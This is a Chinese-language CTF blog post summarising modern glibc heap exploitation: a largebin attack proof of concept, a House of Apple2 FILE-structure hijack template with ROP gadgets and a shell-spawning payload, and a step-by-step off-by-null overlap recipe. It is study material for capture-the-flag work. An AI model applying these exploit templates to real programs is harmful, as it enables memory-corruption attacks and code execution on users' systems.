---
id: glibc-simple
aliases: []
tags:
  - Glibc
date: 2023-02-28 00:25:13
draft: false
title: GLIBC - exploitation-in-latest-glibc-0x00 基本思路
---

> [!TLDR] 
> **在选择更复杂的打法前，先看看能不能 IO leak 泄漏栈地址打 ROP（更容易调试）**

「卷 Glibc 版本」这件事情和常见的用户态 PWN 题（尤其是国内比赛）几乎完全绑定在了一起，故在此记录 2.33 失去 `__free_hook` 之后的常规题做法。主要包括：

- 有公式做题就是快之「只能申请大堆块 - Largebin Attack」
- 有公式做题就是快之「新版本下的控制流劫持首选 - [House of Apple2](https://bbs.kanxue.com/thread-273832.htm)」
- 典中典之「强网杯必考 off by null」

其实 IO 里面也远不只是 Apple2 这条利用链，但是这条链是要求最少 + 资料最多的，所有 IO 劫持控制流都绕不开篡改 `((struct _IO_FILE_plus *) _IO_list_all)->vtable`，利用思路差不多，就没必要去卷其它链。

> [!INFO] 
> 公式以外的情况多半时候都可以到持续更新的 [how2heap](https://github.com/shellphish/how2heap) 上找一些灵感，例如：
>
> - 在没有泄漏的情况下通过双重异或盲绕过 tcache 异或保护 - [safe link double protect](https://github.com/shellphish/how2heap/blob/master/glibc_2.36/safe_link_double_protect.c)
> - 在没有泄漏的情况下把 libc 相关地址放入 tcache 中 - [House of Water](https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_water.c)
> - 没有显式 free 情况下的现代版 House of Orange - [House of Tangerine](https://github.com/shellphish/how2heap/blob/master/glibc_2.39/house_of_tangerine.c)
> - 让 tcache double free 再次伟大 - [House of Botcake](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c)
>
> 各种花里胡哨的利用方法也在持续更新，可以一直关注 [how2heap](https://github.com/shellphish/how2heap)，甚至还提供了网页端调试器，非常好 cheatsheet❤️

## Largebin Attack

Largebin Attack 利用手段自 glibc 2.23 起一直存在，近期 IO 相关利用丰富起来后重新变得热门。

> [!NOTE] 
> 古早时期的 Unsortedbin Attack 效果与 Largebin Attack 类似，都是向任意地址写入一个地址值，通常被用于赋写 `mp_.tcache_bins` 或者 `global_max_fast` 为一个大数，进而打更容易利用的 tcache / fastbin 完成攻击。
>
> 但是现在 Unsortedbin Attack 已经不再可行，取而代之的是条件更加严苛的 Largebin Attack，不过后者还可以确定写入的是指定堆块的地址，这也带来了一些 data-only attack 的机会，例如赋写 `_IO_list_all` 为堆块地址，并在其中伪造 `_IO_FILE_plus` 结构体用 House of Apple2 劫持控制流。

在分配时会遍历当前 Unsortedbin，若没有满足条件的堆块，则会触发整理，将每个堆块放入相应的 bin 中。对于 largebin 范围的堆块，在处理 fd / bk 的同时还要填充 `fd_nextsize` 和 `bk_nextsize` 域，这其中缺少检查，导致了 largebin attack。

在 glibc-2.30 以前有如下两条利用路径：

- 待整理 chunk 小于 largebin 链表中的最小 chunk：
    - 即满足：`(unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk)`
    - 任意写代码：`fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;`
    - 这也是现在新版本的 largebin attack
    - 任意写效果即：`*(fake_bk_nextsize + 0x20) = victim`
    - 对应分支：
    ```c
    if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk)){
		fwd = bck;
		bck = bck->bk;
		victim->fd_nextsize = fwd->fd;
		victim->bk_nextsize = fwd->fd->bk_nextsize;
		fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim; // 任意写
	}
    ```

- 待整理 chunk 大于链表中的最小 chunk：
    - 任意写 1：`victim->bk_nextsize->fd_nextsize = victim;`
    - 任意写 2：`bck = bck->bk; ...; bck = fwd->bk;`
    - 对应分支：
    ```c
    else
    {
        assert((fwd->size & NON_MAIN_ARENA) == 0);
        while ((unsigned long)size < fwd->size)
        {
            fwd = fwd->fd_nextsize;
            assert((fwd->size & NON_MAIN_ARENA) == 0);
        }
        if ((unsigned long)size == (unsigned long)fwd->size)
            /* Always insert in the second position.  */
            fwd = fwd->fd;
        else
        {
            victim->fd_nextsize = fwd;
            victim->bk_nextsize = fwd->bk_nextsize;
            fwd->bk_nextsize = victim;
            victim->bk_nextsize->fd_nextsize = victim;  // 任意写
        }
        bck = fwd->bk; // 任意写
    }
    ```

但是在 glibc-2.30 及以后版本中 else 分支新增了如下两条检测，分别对应上面的两处任意写：

- `if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))`
- `if (bck->fd != fwd)`

> [!Attention] 
> 最后总结出新版本（2.23 - current (2.39)）可行的 Largebin Attack 公式：
> 
> 1. 选择一个合适的 largebin 分组，申请一个较大的堆块 A，*要求 A 的 `bk_nextsize` 域释放后还能被篡改*；
> 2. 申请一个与 A 同属一个分组，但是小于 A 的堆块 B，*B 的地址将会被任意写到目标位置*；
> 3. 将 A 置入 Largebin，B 置入 Unsortedbin；
> 4. UAF 篡改 A 的 `bk_nextsize` 域为 `target_addr - 0x20`，例如 `_IO_list_all - 0x20`；
> 5. 将 B 置入 Largebin，这时候就会触发任意写，使 `*(size_t)target_addr = B`;

简化后的 POC 如下：

```c
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    size_t target = 0;
    size_t *A = malloc(0x428);
    size_t *x1 = malloc(0x18);
    size_t *B = malloc(0x418);
    size_t *x2 = malloc(0x18);
    free(A);
    size_t *x3 = malloc(0x438);
    free(B);

    A[3] = (size_t)((&target) - 4);

    size_t *x4 = malloc(0x438);
    assert((size_t)(B - 2) == target);
    return 0;
}
```

---

## Apple2 板子

Apple2 俨然已经成为了新时代“free hook”，非常好用，还可以结合下述方法绕过沙盒：

1. 通过 gadget 栈迁移，进而打常规 ROP；
    - 通常用 `svcudp_reply+26`：
    ```c
    mov    rbp,QWORD PTR [rdi+0x48]
    mov    rax,QWORD PTR [rbp+0x18]
    lea    r13,[rbp+0x10]
    mov    DWORD PTR [rbp+0x10],0x0
    mov    rdi,r13
    call   QWORD PTR [rax+0x28]
    ```
2. 通过控制寄存器 rdx 打 `setcontext + 61`：
    - 可以找 gadget，使 rdi 或其他寄存器与 rdx 之间进行转换

公式如下：

> [!quote]
> 对 fp 的设置如下：
>
> - `_flags` 设置为 `~(2 | 0x8 | 0x800)`，如果不需要控制 rdi，设置为0即可；如果需要获得 shell，可设置为 `  sh;`，注意前面有两个空格
> - `vtable` 设置为 `_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap` 地址（加减偏移），使其能成功调用 `_IO_wfile_overflow` 即可
> - `_wide_data` 设置为可控堆地址 A，即满足 `*(fp + 0xa0) = A`
> - `_wide_data->_IO_write_base` 设置为 0，即满足 `*(A + 0x18) = 0`
> - `_wide_data->_IO_buf_base` 设置为 0，即满足 `*(A + 0x30) = 0`
> - `_wide_data->_wide_vtable` 设置为可控堆地址 B，即满足 `*(A + 0xe0) = B`
> - `_wide_data->_wide_vtable->doallocate` 设置为地址 C 用于劫持 RIP，即满足 `*(B + 0x68) = C`
> - **`_lock` 设置为可写地址；`mode` 设置大于 0**
>
> 函数的调用链如下：
>
> ```c
> _IO_wfile_overflow
>     _IO_wdoallocbuf
>         _IO_WDOALLOCATE
>             *(fp->_wide_data->_wide_vtable + 0x68)(fp)
> ```

对于常规的 exit 中有如下调用利用链，可以下断点辅助调试：

```c
exit
    __run_exit_handlers
        _IO_cleanup
            _IO_flush_all_lockp
                _IO_wfile_overflow
```

板子如下：

```python
"""
1630aa:>  48 8b 6f 48          >  mov    rbp,QWORD PTR [rdi+0x48]
1630ae:>  48 8b 45 18          >  mov    rax,QWORD PTR [rbp+0x18]
1630b2:>  4c 8d 6d 10          >  lea    r13,[rbp+0x10]
1630b6:>  c7 45 10 00 00 00 00 >  mov    DWORD PTR [rbp+0x10],0x0
1630bd:>  4c 89 ef             >  mov    rdi,r13
1630c0:>  ff 50 28             >  call   QWORD PTR [rax+0x28]
"""
magic_gadget = libc_base + 0x1630AA
leave_ret = libc_base + 0x0000000000050877
add_rsp_0x38_ret = libc_base + 0x0000000000054BF4
pop_rdi_ret = libc_base + 0x0000000000023B65
pop_rsi_ret = libc_base + 0x00000000000251BE
pop_rdx_ret = libc_base + 0x0000000000166262
pop_rax_ret = libc_base + 0x000000000003FA43

_lock = libc_base + 0x1F8A10
_IO_wfile_jumps = libc_base + libc.sym._IO_wfile_jumps
fake_IO_FILE = heap_base + 0x290

f1 = IO_FILE_plus_struct()
f1.flags = u64_ex("  sh;")
f1._lock = _lock
f1._wide_data = fake_IO_FILE + 0xE0
f1._mode = 1
f1.vtable = _IO_wfile_jumps

payload = flat(
    {
        0: {
            0: bytes(f1)[0x10:],
            0xE0 - 0x10: {
                0x18: [0],
                0x30: [0],
                0xE0: [fake_IO_FILE + 0x200],
            },
            # 0x200 - 0x10: {0x68: [0xDEADBEEF]},
            0x200 - 0x10: {0x68: [magic_gadget]},
        },
    }
)
edit(0, payload)
```

此外再附上 `_IO_FILE_plus` 结构体中各个域的偏移：

```c
0x0   _flags
0x8   _IO_read_ptr
0x10  _IO_read_end
0x18  _IO_read_base
0x20  _IO_write_base
0x28  _IO_write_ptr
0x30  _IO_write_end
0x38  _IO_buf_base
0x40  _IO_buf_end
0x48  _IO_save_base
0x50  _IO_backup_base
0x58  _IO_save_end
0x60  _markers
0x68  _chain
0x70  _fileno
0x74  _flags2
0x78  _old_offset
0x80  _cur_column
0x82  _vtable_offset
0x83  _shortbuf
0x88  _lock
//IO_FILE_complete
0x90  _offset
0x98  _codecvt
0xa0  _wide_data
0xa8  _freeres_list
0xb0  _freeres_buf
0xb8  __pad5
0xc0  _mode
0xc4  _unused2
0xd8  vtable
```

---

## Off by Null

就算是堆签到题，也有难易之分。对于需要构造堆块合并去 overlap，尤其是 off by null 这种有公式的题目，等比赛时再硬想就太耗时了，故可以总结 glibc-2.30 后的公式打法。

在早期版本，unlink 过程中并没有什么检查，只需要篡改：

1. prev size
2. prev inuse

两项就可以实现 chunk overlap。

但是在新版本中新增了两项检查：

1. 要求 `prev_size` 与实际 size 一致：
    - `if (chunksize (p) != prev_size (next_chunk (p)))`
2. 要求双向链表通过完整性检查：
    - `if (__builtin_expect (fd->bk != p || bk->fd != p, 0))`

于是 overlap 的构造就麻烦起来了，不过还是能在无爆破的情况下完成目标的：

1. 先申请 8 个堆块备用，其中 1、4、7 作为 barrier：

> 这里的关键是调整 barrier 等堆块的大小，使得待伪造的堆块 C0（也就是 P）最低字节为 0，免去爆破

```python
# STEP1 -  P & 0xff == 0
add(0, 0x418, b"A" * 0x100) # 0 A == P->fd
add(1, 0x108)               # 1 barrier
add(2, 0x438, b"B" * 0x100) # 2 B0 helper
add(3, 0x438, b"C" * 0x100) # 3 C0 (P), P & 0xff == 0
add(4, 0x108, b"4" * 0x100) # 4 barrier
add(5, 0x488, b"H" * 0x100) # 5 H0, helper for write bk->fd, vitcim chunk
add(6, 0x428, b"D" * 0x100) # 6 D == P->bk
add(7, 0x108)               # 7 barrier
```

2. 依次释放 A、C0、D，再释放 B0 触发合并：

> 借 Unsortedbin 设置好 `P->fd = A; P->bk = D;`

```python
# STEP2 - P->fd = A, P->bk = D
delete(0)                   # A
delete(3)                   # C0
delete(6)                   # D
# unsortedbin: D-C0-A   C0->FD=A
delete(2) # merge B0 with C0, preserve P->fd and P->bk
```

3. 申请一个大于 A 和 D 的堆块 B1=B0+0x20，切割 BC 的同时修改之前 C0（P）留下的 size 为更大的 0x551，此外再把 bin 中的 C1=C0-0x20、D、A 依次申请回来：

```python
# STEP3 - Set P->size = 0x551
add(2, 0x458, flat({0x438: p16(0x551)})) # put A,D into largebin, split BC, use B1 to set P->size=0x551
add(3, 0x418)               # C1 from unsortedbin
add(6, 0x428)               # D  from largebin
add(0, 0x418)               # A  from largebin
```

4. 继续绕双向链表的完整性检查，把刚刚拿到的 A 和 C1 依次释放，接下来再申请回 A，此时残留有 A->bk == P，再申请回 C1：

> 注意这里出现了一次 `\x00` 赋写 A->bk，使得残留的 C1 变成了 `(C1 & 0xff..ff00) == C0 == P`

```python
# STEP4 - set fd->bk
delete(0)                   # A == P->fd
delete(3)                   # C1
# unsortedbin: C1-A, A->bk = C1
add(0, 0x418, b"a" * 8)     # partial overwrite bk - A->bk == P & 0xff..ff00
add(3, 0x418)
```

5. 故技重施，依次释放 C1、D、H0，使合成 HD，借此保存 D->fd == C1，进而申请一个 H1=H0+0x70 来部分写成 `D->fd = P`：

```python
# STEP5 - use unsortedbin to set bk->fd
delete(3)                   # C1
delete(6)                   # D = P->bk
# unsortedbin: D-C1, D->FD = C1
delete(5)                   # merge D with H0, preserve D->fd 

# fix D's size and write \x00
add(5, 0x500-8, '5'*0x488 + p64(0x431)) # H1, bk->fd = P, partial write \x00
add(6, 0x3b0)               # D, recovery
```

6. 现在已经完成 size 伪造和双向链表的伪造，最后用 barrier-4 设置 `fake_prev_size = 0x550 = fake_P_size = C0+barrier4`，此外借助 off by null 清空 prev inuse 域即可删除 H1 触发合并成功得到 overlap：

> 这也是为什么 H1 申请时要按照 0x500-8，免得大小不匹配

```python
# STEP6 - unlink
delete(4)                   # barrier 4
add(4, 0x108, b"a"*0x100 + p64(0x550)) # off by null
delete(5)                   # H1
```

---

## References

\[1\] [CTF 中 glibc堆利用 及 IO_FILE 总结](https://bbs.kanxue.com/thread-272098.htm) . *[winmt](https://bbs.kanxue.com/homepage-949925.htm)*

\[2\] [House of apple 一种新的glibc中IO攻击方法 (2)](https://bbs.kanxue.com/thread-273832.htm) . *[roderick01](https://bbs.kanxue.com/homepage-956675.htm)*

\[3\] [Educational Heap Exploitation](https://github.com/shellphish/how2heap) . *[shellphish](https://github.com/shellphish)*

\[4\] [glibc2.29+的off by null利用](https://tttang.com/archive/1614/#toc__6) . *[cru5h](https://tttang.com/user/cru5h)*
